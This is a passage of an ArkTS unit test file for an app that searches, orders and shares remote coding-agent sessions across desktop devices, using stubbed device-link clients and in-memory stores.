import { describe, it, expect } from '@ohos/hypium';
import {
  parseMessage,
  parseSession,
  readAny,
  readBool,
  readNum,
  readObj,
  readStr,
  recordOrEmpty,
  safeErrorMessage,
  DeviceView,
  RemoteMessage,
  RemoteSession,
  sortMessagesAsc,
} from '../main/ets/core/tasks/TaskModels';
import {
  RemoteImageRef,
  composerAttachmentRenderKey,
  createComposerAttachmentLocalId,
} from '../main/ets/core/attachments/AttachmentModels';
import {
  isRetryablePresignStatus,
  isUploadRevisionCurrent,
  uploadExtForName,
} from '../main/ets/core/attachments/AttachmentUpload';
import { renameForImagePreprocess } from '../main/ets/core/attachments/ImagePreprocess';
import { parseGoalModeState } from '../main/ets/core/goals/GoalModels';
import { GoalStore } from '../main/ets/core/goals/GoalStore';
import {
  shouldAutoCollapseUserMessage,
  collapsedUserMessageLineLimit,
  toolResultHasError,
  buildRenderItems,
  RenderToolGroupItem,
  RenderToolItem,
  RenderToolMediaItem,
  RenderTodoCardItem,
  RenderTodoItem,
  RenderAgentTaskItem,
  RenderSubagentGroupItem,
  RenderThinkingItem,
  RenderWorkGroupItem,
  RenderMessageItem,
  todoCardContentSignature,
  todoCardIndexAtRankFromTail,
  todoCardRankFromTail,
  findTodoPlanInsertions,
  latestTaskPlanWindowResolved,
  applyCodexPlanSnapshotOnDone,
  markCodexPlanTurnFailed,
  planRowSealed,
  planRowTurnFailed,
  parseThinkingPresentation,
  shouldSplitToolGroup,
  turnFinalAssistantIds,
} from '../main/ets/core/messages/MessageRender';
import {
  workExplorationSummary,
  workGroupHasHiddenRows,
  workPreviewRows,
} from '../main/ets/core/messages/WorkGroupPresentation';
import {
  AgentTaskUpdate,
  deriveAgentTaskStatus,
} from '../main/ets/core/messages/AgentTaskStore';
import {
  findSubagentGroupByKey,
  subagentStatusLabel,
} from '../main/ets/core/messages/SubagentDetailPresentation';
import {
  findMessageSearchHits,
  messageSearchPagingPresentation,
  nextMessageSearchIndex,
  reconcileMessageSearchIndex,
} from '../main/ets/core/messages/MessageSearch';
import { projectToolUseActions } from '../main/ets/core/messages/ToolUsePresentation';
import {
  AuthoritativeEmptyDeferrals,
  buildAgentUserContent,
  buildPersistedUserContent,
  MessageStore,
  TEXT_DELTA_BATCH_INTERVAL_MS,
  preferIncomingCreatedMessage,
  reconcileDeferredAuthoritativeEmptyMessages,
  shouldDeferAuthoritativeEmptyWindow,
  shouldPreserveCachedMessagesForAuthoritativeEmpty,
} from '../main/ets/core/messages/MessageStore';
import {
  CachedSessionMessages,
  MAX_CACHED_MESSAGE_SESSIONS,
  MAX_CACHED_SESSION_MESSAGES,
  normalizeSessionCacheMessages,
  parseSessionMessageSnapshot,
  serializeSessionMessageSnapshot,
} from '../main/ets/core/messages/SessionMessageCacheStore';
import {
  formatSessionActivityElapsed,
  sessionActivityElapsedMs,
} from '../main/ets/core/messages/SessionActivityPresentation';
import {
  generationStatusLabel,
  SessionGenerationStatus,
} from '../main/ets/core/messages/GenerationStatus';
import {
  attachmentDisplayName,
  compareTaskListLabels,
  compareTaskSessionsForList,
  deriveOptimisticSessionTitle,
  resolveTaskRightStatus,
  taskActivityAt,
  taskDisplayTitle,
  taskIsAutomation,
  taskListCategory,
  taskListEntryPresentationState,
  taskListShouldShowFloatingBarAtBoundary,
  taskPreviewText,
  taskProjectKey,
  taskProjectName,
  taskRelativeTime,
  taskVisibleInTaskList,
  taskVisibleOnHome,
} from '../main/ets/pages/TaskListPresentation';
import {
  parseTaskListPreferences,
  serializeTaskListPreferences,
  TaskListPreferences,
} from '../main/ets/core/tasks/TaskListPreferenceStore';
import {
  consumeTaskSplitRouteSelection,
  handoffTaskSplitRouteSelection,
  isWideTaskLayout,
  TASK_FOLD_STATUS_EXPANDED,
  TASK_FOLD_STATUS_FOLDED,
  TASK_FOLD_STATUS_HALF_FOLDED,
  taskDetailKeyboardInset,
  taskDetailPaneWidth,
  taskListPaneWidth,
  taskSplitRatioForDrag,
  TASK_SPLIT_DEFAULT_RATIO,
} from '../main/ets/pages/TaskSplitLayout';

import {
  groupInlineTokens,
  groupMarkdownSelectableBlocks,
  parseMarkdown,
  tokenizeInline,
} from '../main/ets/core/messages/MarkdownParser';
import { tokenizeThinkingText } from '../main/ets/core/messages/ThinkingTextParser';
import { buildMarkdownTableColumnWidths } from '../main/ets/core/messages/MarkdownTableLayout';
import {
  appendAutoResumePendingMessage,
  deriveAutoResumePresentation,
  summarizeAutoResumeError,
} from '../main/ets/core/messages/AutoResumePresentation';
import {
  InputQueueStore,
  pendingQueueBubbleRenderKey,
  parseInputProjection,
  parseQueuedInputItem,
} from '../main/ets/core/messages/InputQueueStore';
import {
  ComposerDraftStore,
  composerDraftScopeKey,
  composerDraftStorageKey,
  shouldApplyComposerDraftRead,
} from '../main/ets/core/messages/ComposerDraftStore';
import { SecureStore } from '../main/ets/core/storage/SecureStore';
import {
  freezeShareProjection,
  isShareableMessageKind,
  isShareableRenderType,
  planShareSegments,
  SHARE_IMAGE_SAFETY_MARGIN_PX,
  SHARE_MAX_IMAGE_EDGE_PX,
  SHARE_MAX_SEGMENTS,
  shareImageFileName,
  shareSegmentStartIndices,
  shareSegmentStartIndicesByHeight,
} from '../main/ets/core/sharing/ConversationShareProjection';
import {
  SHARE_STAGE_FAILED,
  SHARE_STAGE_IDLE,
  SHARE_STAGE_PREVIEW,
  SHARE_STAGE_RENDERING,
  SHARE_STAGE_SHARING,
  ShareFlowState,
  shareFlowBusy,
} from '../main/ets/core/sharing/ShareResourceLifecycle';
import {
  SecurityObservabilityAdapter,
  SecurityObservabilitySink,
} from '../main/ets/core/observability/SecurityObservabilityAdapter';
import {
  getSystemFontSizeScale,
  setSystemFontSizeScale,
  uiScaledMaxWidth,
} from '../main/ets/components/UiKit';
import {
  classifySessionRetention,
  hasProtectedMessageRow,
  isProtectedMessageRow,
  pushAuthorityAccepted,
  REGULAR_GLOBAL_MESSAGE_BYTES_BUDGET,
  RetentionCandidate,
  selectRegularBudgetEvictions,
  trimMessageWindow,
} from '../main/ets/core/messages/MessageRetentionPolicy';
import {
  ComposerDocument,
  composerDocumentProjectedText,
  projectSlashCommandsInText,
  SerializedComposerDocument,
  slashCommandDisplayLabel,
  textComposerDocument,
} from '../main/ets/core/messages/ComposerDocument';
import {
  extendCoverageEarlier,
  MessageWindowCoverage,
  reconcileLatestMessageWindow,
} from '../main/ets/core/messages/HistoryWindowCoverage';
import {
  historyRetryLimits,
  isPayloadTooLargeError,
  shouldInferOlderMessagesFromCount,
  shouldKeepOlderMessagesAffordance,
} from '../main/ets/core/messages/MessagePaging';
import {
  computeReconnectDelayMs,
  DlChannels,
  Envelope,
  expandMakerEventBatchPayload,
  RECONNECT_CONGESTION_STABLE_RESET_MS,
  RECONNECT_STABLE_RESET_MS,
  ReconnectStability,
} from '../main/ets/core/device-link/DlProtocol';
import {
  assertInvokeSucceeded,
  DlError,
  DlClient,
  DlClientOptions,
  DlInvokeOptions,
  isSafeUnsentDlError,
} from '../main/ets/core/device-link/DlClient';
import {
  ComposerModelOption,
  groupComposerModelOptions,
  parseChoiceOptions,
  parseModelOptions,
  parseModelVisibilityOverrides,
  parseProviderModelOptions,
  reconcileModelEffort,
  resolveNewSessionDefaultModel,
  selectedPermissionModeLabel,
} from '../main/ets/core/ComposerCatalog';
import { TaskStore } from '../main/ets/core/tasks/TaskStore';
import {
  listTaskSearchProjects,
  mergeTaskSearchPages,
  normalizeTaskSearchWorkingDir,
  parseTaskSearchResponse,
  remoteTaskSearchIgnoredWorkingDirs,
  searchCachedTaskSessions,
  TaskSearchFilters,
  TaskSearchOrigin,
  TaskSearchRequest,
  TaskSearchStore,
} from '../main/ets/core/tasks/TaskSearchStore';
import {
  normalizeTaskProjectPath,
  parseTaskProjectOrderSnapshot,
  reconcileTaskProjectOrder,
  reorderVisibleTaskProjectOrder,
  SIDEBAR_GET_PROJECT_ORDER,
  TaskProjectOrderStore,
  taskProjectOrderKey,
  taskProjectOrderKeysFromHost,
} from '../main/ets/core/tasks/TaskProjectOrderStore';
import { ShareSelectionStore } from '../main/ets/core/sharing/ShareSelectionStore';
import {
  TASK_LIST_RECONCILE_INTERVAL_MS,
  TaskListReconcileBackoff,
} from '../main/ets/core/tasks/TaskListReconcilePolicy';
import {
  CachedTaskListDevice,
  parseTaskListSnapshot,
  serializeTaskListSnapshot,
} from '../main/ets/core/tasks/TaskListSnapshotStore';
import {
  COMPOSER_SCROLL_ACTION_HIDE,
  COMPOSER_SCROLL_ACTION_NONE,
  COMPOSER_SCROLL_ACTION_SHOW,
  firstVisibleMessageRenderIndex,
  FOLLOW_LATEST_RETRY_DELAYS,
  historyGestureAllowsLoad,
  INITIAL_HISTORY_AUTOFILL_PAGES,
  messageListBottomIndex,
  messageListItemPresentationState,
  messageListRenderNodeKey,
  shouldAutoLoadEarlier,
  shouldTakeOverTail,
  updateComposerScrollVisibility,
} from '../main/ets/pages/TaskScrollState';
import {
  isTextFileReference,
  splitFileReferenceLocation,
} from '../main/ets/core/files/FileReference';
import {
  decideNewSessionRecoveryAction,
  exactNewSessionRecord,
  isTransientNewSessionError,
  shouldBlockNewSessionRemoteOperation,
} from '../main/ets/core/tasks/NewSessionCreationStore';
import {
  askOptionPresentations,
  buildPlanReviewEvidence,
  buildPermissionDecision,
  isHighRiskShellCommand,
  permissionCanAlwaysAllow,
  permissionRiskSummary,
  permissionAutoReviewUnavailableNotice,
  pendingInteractionsBlockRemoteComposer,
  interactionKindLabel,
  interactionPriority,
  sessionScopedPermissionSuggestions,
  sortPendingInteractions,
} from '../main/ets/core/interactions/InteractionPresentation';
import {
  AskUserDraft,
  InteractionStore,
  PendingInteraction,
} from '../main/ets/core/interactions/InteractionStore';

function planToolMessage(
  id: string,
  toolName: string,
  input: Record<string, Object>,
  useId: string,
): RemoteMessage {
  const message = new RemoteMessage();
  message.id = id;
  message.clientId = id;
  message.role = 'tool_use';
  message.toolUseId = useId;
  const content: Record<string, Object> = {};
  content['toolUseId'] = useId;
  content['toolName'] = toolName;
  content['input'] = input;
  message.content = content;
  return message;
}

function planToolResult(id: string, useId: string, text: string): RemoteMessage {
  const message = new RemoteMessage();
  message.id = id;
  message.clientId = id;
  message.role = 'tool_result';
  message.toolUseId = useId;
  const content: Record<string, Object> = {};
  content['toolUseId'] = useId;
  content['text'] = text;
  message.content = content;
  return message;
}

function budgetCandidate(
  sessionId: string,
  rowCount: number,
  bytes: number,
  accessOrder: number,
  leased: boolean,
  hasProtectedRows: boolean,
): RetentionCandidate {
  const candidate = new RetentionCandidate();
  candidate.sessionId = sessionId;
  candidate.rowCount = rowCount;
  candidate.bytes = bytes;
  candidate.accessOrder = accessOrder;
  candidate.leased = leased;
  candidate.hasProtectedRows = hasProtectedRows;
  return candidate;
}

function userBoundary(id: string): RemoteMessage {
  const message = new RemoteMessage();
  message.id = id;
  message.clientId = id;
  message.role = 'user';
  message.content = id;
  return message;
}

/** 观测 sink 测试替身：ArkTS 不允许接口对象字面量，用具名类实现。 */
class RecordingObservabilitySink implements SecurityObservabilitySink {
  bound: string[] = [];
  cleared: number = 0;

  bindUser(userId: string): void {
    this.bound.push(userId);
  }

  clearUser(): void {
    this.cleared += 1;
  }
}

/** 始终抛错的 sink：验证观测失败不会影响认证流程。 */
class ThrowingObservabilitySink implements SecurityObservabilitySink {
  bindUser(userId: string): void {
    throw new Error('sdk-failure');
  }

  clearUser(): void {
    throw new Error('sdk-failure');
  }
}

/** 草稿持久化测试替身；不触碰真实 preferences，也不写入设备凭证。 */
class MemorySecureStore extends SecureStore {
  values: Map<string, string> = new Map();

  async get(key: string, defaultValue: string): Promise<string> {
    return this.values.get(key) ?? defaultValue;
  }

  async set(key: string, value: string): Promise<void> {
    this.values.set(key, value);
  }

  async remove(key: string): Promise<void> {
    this.values.delete(key);
  }
}

class DeferredEnvelope {
  promise: Promise<Envelope>;
  private resolver: ((value: Envelope) => void) | undefined = undefined;

  constructor() {
    this.promise = new Promise<Envelope>((resolve) => {
      this.resolver = resolve;
    });
  }

  resolve(value: Envelope): void {
    const resolver = this.resolver;
    if (resolver === undefined) return;
    this.resolver = undefined;
    resolver(value);
  }
}

function successfulInvokeEnvelope(result: Object | undefined): Envelope {
  const payload: Record<string, Object> = {};
  payload['ok'] = true;
  if (result !== undefined) payload['result'] = result;
  const envelope = new Envelope();
  envelope.payload = payload;
  return envelope;
}

/** 只覆盖恢复测试所需的调用；不启动真实 WebSocket 或改变设备状态。 */
class RecoveryTestClient extends DlClient {
  private historyCalls: number = 0;
  private historyStartResolver: (() => void) | undefined = undefined;
  historyStarted: Promise<void>;
  staleHistory: DeferredEnvelope = new DeferredEnvelope();

  constructor() {
    super(new DlClientOptions());
    this.historyStarted = new Promise<void>((resolve) => {
      this.historyStartResolver = resolve;
    });
  }

  async subscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  async unsubscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    if (options.channel !== 'local-db:messages:list') {
      return Promise.resolve(successfulInvokeEnvelope(false));
    }
    this.historyCalls += 1;
    if (this.historyCalls === 1) {
      return Promise.resolve(successfulInvokeEnvelope([]));
    }
    const resolver = this.historyStartResolver;
    if (resolver !== undefined) {
      this.historyStartResolver = undefined;
      resolver();
    }
    return this.staleHistory.promise;
  }
}

/** 只覆盖消息设备切换测试所需的空历史响应；不连接真实 WebSocket。 */
class EmptyHistoryTestClient extends DlClient {
  constructor() {
    super(new DlClientOptions());
  }

  async subscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  async unsubscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    return Promise.resolve(successfulInvokeEnvelope([]));
  }
}

/** 只覆盖消息深链定位切换设备测试所需的延迟 around 响应。 */
class DeferredAroundTestClient extends DlClient {
  aroundResponse: DeferredEnvelope = new DeferredEnvelope();
  aroundStarted: Promise<void>;
  private aroundStartResolver: (() => void) | undefined = undefined;

  constructor() {
    super(new DlClientOptions());
    this.aroundStarted = new Promise<void>((resolve) => {
      this.aroundStartResolver = resolve;
    });
  }

  async subscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  async unsubscribe(deviceId: string, topics: string[], timeoutMs: number = 0): Promise<Envelope> {
    return successfulInvokeEnvelope(undefined);
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    if (options.channel === 'local-db:messages:around-client-id') {
      const resolver = this.aroundStartResolver;
      if (resolver !== undefined) {
        this.aroundStartResolver = undefined;
        resolver();
      }
      return this.aroundResponse.promise;
    }
    return Promise.resolve(successfulInvokeEnvelope([]));
  }
}

/** 只覆盖 maker:list-active 恢复测试所需的调用；不连接真实设备。 */
class ActiveSnapshotTestClient extends DlClient {
  activeCalls: number = 0;
  activeResponse: DeferredEnvelope = new DeferredEnvelope();

  constructor() {
    super(new DlClientOptions());
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    if (options.channel === 'maker:list-active') {
      this.activeCalls += 1;
      return this.activeResponse.promise;
    }
    return Promise.resolve(successfulInvokeEnvelope([]));
  }
}

/** 旧 Desktop 搜索 channel 回退测试替身：明确返回错误码而不是拼在 message 中。 */
class LegacyTaskSearchTestClient extends DlClient {
  channels: string[] = [];
  private readonly rejectWithPlainCode: boolean;
  private readonly rejectWithCyclicError: boolean;
  private readonly rejectWithUndefinedError: boolean;

  constructor(
    rejectWithPlainCode: boolean = false,
    rejectWithCyclicError: boolean = false,
    rejectWithUndefinedError: boolean = false,
  ) {
    super(new DlClientOptions());
    this.rejectWithPlainCode = rejectWithPlainCode;
    this.rejectWithCyclicError = rejectWithCyclicError;
    this.rejectWithUndefinedError = rejectWithUndefinedError;
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    this.channels.push(options.channel);
    if (options.channel === DlChannels.CONVERSATIONS_SEARCH) {
      if (this.rejectWithCyclicError) {
        const error: Record<string, Object> = {};
        error['self'] = error;
        return Promise.reject(error);
      }
      if (this.rejectWithUndefinedError) return Promise.reject(undefined);
      if (this.rejectWithPlainCode) {
        const error: Record<string, Object> = {};
        error['code'] = 'CHANNEL_NOT_ALLOWED';
        return Promise.reject(error);
      }
      return Promise.reject(new DlError('CHANNEL_NOT_ALLOWED', 'search channel is unavailable'));
    }
    if (options.channel === DlChannels.SESSIONS_LIST) {
      return Promise.resolve(successfulInvokeEnvelope([
        searchSession('legacy-hit', 'Legacy search task', '/repo', 'legacy body'),
      ]));
    }
    return Promise.resolve(successfulInvokeEnvelope([]));
  }
}

/** 旧 Desktop 项目顺序 channel 回退测试替身：错误码可能是普通对象字段。 */
class LegacyTaskProjectOrderTestClient extends DlClient {
  channels: string[] = [];
  private readonly rejectWithUndefinedError: boolean;

  constructor(rejectWithUndefinedError: boolean = false) {
    super(new DlClientOptions());
    this.rejectWithUndefinedError = rejectWithUndefinedError;
  }

  invoke(deviceId: string, options: DlInvokeOptions): Promise<Envelope> {
    this.channels.push(options.channel);
    if (options.channel === SIDEBAR_GET_PROJECT_ORDER) {
      if (this.rejectWithUndefinedError) return Promise.reject(undefined);
      const error: Record<string, Object> = {};
      error['code'] = 'CHANNEL_NOT_ALLOWED';
      return Promise.reject(error);
    }
    return Promise.resolve(successfulInvokeEnvelope([]));
  }
}

function searchSession(
  id: string,
  title: string,
  workingDir: string,
  preview: string,
): RemoteSession {
  const session = new RemoteSession();
  session.id = id;
  session.title = title;
  session.workingDir = workingDir;
  session.preview = preview;
  session.workspaceKind = 'project';
  session.agentKind = 'cc';
  session.status = 'active';
  session.updatedAt = '2026-08-26T00:00:00.000Z';
  session.userSendAt = session.updatedAt;
  return session;
}

export default function localUnitTest() {
  describe('taskSearchAlignment', () => {
    it('normalizesWorktreesAndKeepsProjectKeysDeviceScoped', 0, () => {
      expect(normalizeTaskSearchWorkingDir('/repo/.cindy-worktrees/feature-a'))
        .assertEqual('/repo');
      expect(normalizeTaskSearchWorkingDir('C:\\repo\\.claude\\worktrees\\feature-a'))
        .assertEqual('c:/repo');
      expect(normalizeTaskSearchWorkingDir('C:\\Repo\\.claude\\worktrees\\feature-a'))
        .assertEqual('c:/repo');

      const first = searchSession('one', 'One', '/repo/.cindy-worktrees/feature-a', '');
      const second = searchSession('two', 'Two', '/repo', '');
      const dialogue = searchSession('dialogue', 'Dialogue', '/repo', '');
      dialogue.workspaceKind = 'dialogue';
      const deleted = searchSession('deleted', 'Deleted', '/repo', '');
      deleted.status = 'deleted';
      const projects = listTaskSearchProjects(
        'desktop-a', 'Studio', [first, second, dialogue, deleted]);
      expect(projects.length).assertEqual(1);
      expect(projects[0].key).assertEqual('desktop-a:/repo');
      expect(projects[0].remoteWorkingDirs.length).assertEqual(2);
      expect(projects[0].remoteWorkingDirs[0]).assertEqual('/repo/.cindy-worktrees/feature-a');
      expect(projects[0].remoteWorkingDirs[1]).assertEqual('/repo');
      expect(projects[0].count).assertEqual(2);
    });

    it('scopesSessionSnapshotLookupsToTheOwningDevice', 0, () => {
      const tasks = new TaskStore();
      const first = searchSession('same-session-id', 'Studio task', '/repo', '');
      first.source = 'scheduler';
      const second = searchSession('same-session-id', 'Laptop task', '/repo', '');
      second.source = 'manual';
      tasks.upsertSession('desktop-a', first);
      tasks.upsertSession('desktop-b', second);

      expect(tasks.findSessionById('same-session-id', 'desktop-a')?.source)
        .assertEqual('scheduler');
      expect(tasks.findSessionById('same-session-id', 'desktop-b')?.source)
        .assertEqual('manual');
    });

    it('searchesCachedContentButSkipsWorkerSessions', 0, () => {
      const origin = new TaskSearchOrigin();
      origin.deviceId = 'desktop-a';
      origin.deviceName = 'Studio';
      const request = new TaskSearchRequest();
      request.query = 'needle';
      const contentHit = searchSession('content', 'Unrelated', '/repo', 'A needle in the message');
      const worker = searchSession('worker', 'Needle worker', '/repo', '');
      worker.orcaRole = 'worker';
      const page = searchCachedTaskSessions(origin, request, [contentHit, worker]);
      expect(page.results.length).assertEqual(1);
      expect(page.results[0].session.id).assertEqual('content');
      expect(page.results[0].matchKind).assertEqual('content');
      expect(page.results[0].locallyCached).assertEqual(true);
      expect(page.usedCacheFallback).assertEqual(true);
    });

    it('parsesContentHitsAndDeduplicatesOnlyWithinOneDevice', 0, () => {
      const session: Record<string, Object> = {};
      session['id'] = 'same-id';
      session['title'] = 'Old task';
      session['workingDir'] = '/repo';
      session['workspaceKind'] = 'project';
      session['agentKind'] = 'cc';
      session['status'] = 'active';
      session['updatedAt'] = '2026-08-26T00:00:00.000Z';
      session['userSendAt'] = '2026-08-26T00:00:00.000Z';
      const hit: Record<string, Object> = {};
      hit['preview'] = 'needle in message history';
      hit['messageClientId'] = 'message-7';
      const item: Record<string, Object> = {};
      item['session'] = session;
      item['matchKind'] = 'content';
      item['contentHit'] = hit;
      item['rankScore'] = 4;
      const raw: Record<string, Object> = {};
      raw['results'] = [item];

      const studioPage = parseTaskSearchResponse(raw, 'needle', 'desktop-a', 'Studio');
      const laptopPage = parseTaskSearchResponse(raw, 'needle', 'desktop-b', 'Laptop');
      studioPage.searchedDeviceCount = 1;
      studioPage.remoteDeviceCount = 1;
      laptopPage.searchedDeviceCount = 1;
      laptopPage.remoteDeviceCount = 1;
      const request = new TaskSearchRequest();
      request.query = 'needle';
      const merged = mergeTaskSearchPages([studioPage, laptopPage], request);
      expect(merged.results.length).assertEqual(2);
      expect(merged.results[0].contentMessageClientId).assertEqual('message-7');
      expect(merged.results[0].deviceId === merged.results[1].deviceId).assertEqual(false);
    });

    it('detectsLegacyHostsThatIgnoreWorkingDirectoryFilters', 0, () => {
      const session: Record<string, Object> = {};
      session['id'] = 'outside';
      session['title'] = 'Task';
      session['workingDir'] = '/other';
      session['status'] = 'active';
      const item: Record<string, Object> = {};
      item['session'] = session;
      const raw: Record<string, Object> = {};
      raw['results'] = [item];
      const page = parseTaskSearchResponse(raw, 'task', 'desktop-a', 'Studio');
      expect(remoteTaskSearchIgnoredWorkingDirs(page, ['/repo'])).assertEqual(true);
      expect(remoteTaskSearchIgnoredWorkingDirs(page, null)).assertEqual(false);

      const filters = new TaskSearchFilters();
      filters.workingDirs = ['/repo'];
      expect(filters.workingDirs?.length).assertEqual(1);
    });

    it('fallsBackThroughLegacySessionListWhenSearchErrorUsesAChannelCode', 0, async () => {
      const client = new LegacyTaskSearchTestClient();
      const store = new TaskSearchStore();
      store.attach(client, new TaskStore(), (_deviceId: string) => Promise.resolve());
      const origin = new TaskSearchOrigin();
      origin.deviceId = 'desktop-a';
      origin.deviceName = 'Studio';
      origin.reachable = true;
      const request = new TaskSearchRequest();
      request.query = 'legacy';

      const page = await store.search([origin], request);
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        DlChannels.CONVERSATIONS_SEARCH,
        DlChannels.SESSIONS_LIST,
      ]));
      expect(page.results.length).assertEqual(1);
      expect(page.results[0].session.id).assertEqual('legacy-hit');
      expect(page.usedCacheFallback).assertEqual(true);
    });

    it('fallsBackWhenSearchErrorCarriesAPlainChannelCode', 0, async () => {
      const client = new LegacyTaskSearchTestClient(true);
      const store = new TaskSearchStore();
      store.attach(client, new TaskStore(), (_deviceId: string) => Promise.resolve());
      const origin = new TaskSearchOrigin();
      origin.deviceId = 'desktop-a';
      origin.deviceName = 'Studio';
      origin.reachable = true;
      const request = new TaskSearchRequest();
      request.query = 'legacy';

      const page = await store.search([origin], request);
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        DlChannels.CONVERSATIONS_SEARCH,
        DlChannels.SESSIONS_LIST,
      ]));
      expect(page.results[0].session.id).assertEqual('legacy-hit');
    });

    it('KeepsCachedSearchAliveWhenRemoteErrorCannotBeSerialized', 0, async () => {
      const client = new LegacyTaskSearchTestClient(false, true);
      const tasks = new TaskStore();
      tasks.upsertSession('desktop-a', searchSession('cached-hit', 'Cached search task', '/repo', 'legacy body'));
      const store = new TaskSearchStore();
      store.attach(client, tasks, (_deviceId: string) => Promise.resolve());
      const origin = new TaskSearchOrigin();
      origin.deviceId = 'desktop-a';
      origin.deviceName = 'Studio';
      origin.reachable = true;
      const request = new TaskSearchRequest();
      request.query = 'legacy';

      const page = await store.search([origin], request);
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        DlChannels.CONVERSATIONS_SEARCH,
      ]));
      expect(page.usedCacheFallback).assertEqual(true);
      expect(page.results.length).assertEqual(1);
      expect(page.results[0].session.id).assertEqual('cached-hit');
    });

    it('KeepsSearchFallbackAliveWhenRemoteErrorIsUndefined', 0, async () => {
      const client = new LegacyTaskSearchTestClient(false, false, true);
      const tasks = new TaskStore();
      tasks.upsertSession('desktop-a', searchSession('cached-undefined-error', 'Cached undefined error', '/repo', 'legacy body'));
      const store = new TaskSearchStore();
      store.attach(client, tasks, (_deviceId: string) => Promise.resolve());
      const origin = new TaskSearchOrigin();
      origin.deviceId = 'desktop-a';
      origin.deviceName = 'Studio';
      origin.reachable = true;
      const request = new TaskSearchRequest();
      request.query = 'legacy';

      const page = await store.search([origin], request);
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        DlChannels.CONVERSATIONS_SEARCH,
      ]));
      expect(page.usedCacheFallback).assertEqual(true);
      expect(page.results[0].session.id).assertEqual('cached-undefined-error');
    });
  });

  describe('taskProjectOrderAlignment', () => {
    it('normalizesWindowsWorktreesAndPreservesDeviceScopedKeys', 0, () => {
      expect(normalizeTaskProjectPath('C:\\Repo\\.claude\\worktrees\\feature-a'))
        .assertEqual('c:/repo');
      expect(normalizeTaskProjectPath('//SERVER/Repo/.worktrees/feature-b'))
        .assertEqual('//server/repo');
      expect(taskProjectOrderKey('desktop-a', '/repo/.cindy-worktrees/feature-a'))
        .assertEqual('desktop-a:/repo');
      expect(JSON.stringify(taskProjectOrderKeysFromHost('desktop-a', ['local:C:/Repo', 'device:x:/bad'])))
        .assertEqual(JSON.stringify(['desktop-a:c:/repo']));
    });

    it('ReconcilesNewProjectsWithoutReorderingExistingProjects', 0, () => {
      const previous = ['desktop-a:/repo/two', 'desktop-a:/repo/one'];
      const active = ['desktop-a:/repo/one', 'desktop-a:/repo/two', 'desktop-a:/repo/three'];
      expect(JSON.stringify(reconcileTaskProjectOrder(previous, active)))
        .assertEqual(JSON.stringify([
          'desktop-a:/repo/two', 'desktop-a:/repo/one', 'desktop-a:/repo/three',
        ]));
    });

    it('CanonicalizesRawProjectKeysDuringReconcile', 0, () => {
      const previous = ['desktop-a:C:\\Repo\\Two'];
      const active = [
        'desktop-a:C:\\Repo\\.cindy-worktrees\\feature-a',
        'desktop-a:C:\\Repo\\Two',
      ];
      expect(JSON.stringify(reconcileTaskProjectOrder(previous, active)))
        .assertEqual(JSON.stringify(['desktop-a:c:/repo/two', 'desktop-a:c:/repo']));
    });

    it('ReordersOnlyVisibleProjectsAndLeavesHiddenSlotsInPlace', 0, () => {
      const full = [
        'desktop-b:/hidden-before',
        'desktop-a:/repo/one',
        'desktop-a:/repo/two',
        'desktop-b:/hidden-after',
      ];
      const next = reorderVisibleTaskProjectOrder(
        full,
        ['desktop-a:/repo/one', 'desktop-a:/repo/two'],
        'desktop-a:/repo/two',
        0,
      );
      expect(JSON.stringify(next)).assertEqual(JSON.stringify([
        'desktop-b:/hidden-before',
        'desktop-a:/repo/two',
        'desktop-a:/repo/one',
        'desktop-b:/hidden-after',
      ]));
    });

    it('ParsesOwnerStampAndRejectsMalformedSnapshotFields', 0, () => {
      const raw: Record<string, Object> = {};
      raw['authoritative'] = true;
      raw['projectOrder'] = 'custom';
      raw['manualProjectOrder'] = ['local:/repo', 'local:/repo'];
      const stamp: Record<string, Object> = {};
      stamp['dataOwnerId'] = 'account-1';
      stamp['ownerGeneration'] = 4;
      raw['ownerStamp'] = stamp;
      const parsed = parseTaskProjectOrderSnapshot(raw);
      expect(parsed.authoritative).assertEqual(true);
      expect(parsed.projectOrder).assertEqual('custom');
      expect(parsed.manualProjectOrder.length).assertEqual(1);
      expect(parsed.ownerStamp?.dataOwnerId).assertEqual('account-1');
      expect(parsed.ownerStamp?.ownerGeneration).assertEqual(4);
    });

    it('FallsBackWhenProjectOrderErrorCarriesAPlainChannelCode', 0, async () => {
      const client = new LegacyTaskProjectOrderTestClient();
      const store = new TaskProjectOrderStore();
      store.attach(client, (_deviceId: string) => Promise.resolve(), () => 'account-1');

      const result = await store.fetch('desktop-a');
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        SIDEBAR_GET_PROJECT_ORDER,
      ]));
      expect(result.kind).assertEqual('unavailable');
      expect(result.snapshot?.available).assertEqual(false);
    });

    it('KeepsProjectOrderFallbackAliveWhenRemoteErrorIsUndefined', 0, async () => {
      const client = new LegacyTaskProjectOrderTestClient(true);
      const store = new TaskProjectOrderStore();
      store.attach(client, (_deviceId: string) => Promise.resolve(), () => 'account-1');

      const result = await store.fetch('desktop-a');
      expect(JSON.stringify(client.channels)).assertEqual(JSON.stringify([
        SIDEBAR_GET_PROJECT_ORDER,
      ]));
      expect(result.kind).assertEqual('transient');
      expect(result.snapshot === undefined).assertEqual(true);
    });
  });

  describe('shareSelectionAlignment', () => {
    it('keepsSelectionScopedToOneSessionAndSupportsPreselection', 0, () => {
      const store = new ShareSelectionStore();
      store.enter('session-a', 'message-2');
      store.toggle('message-1');
      expect(store.isActive()).assertEqual(true);
      expect(store.activeSessionId()).assertEqual('session-a');
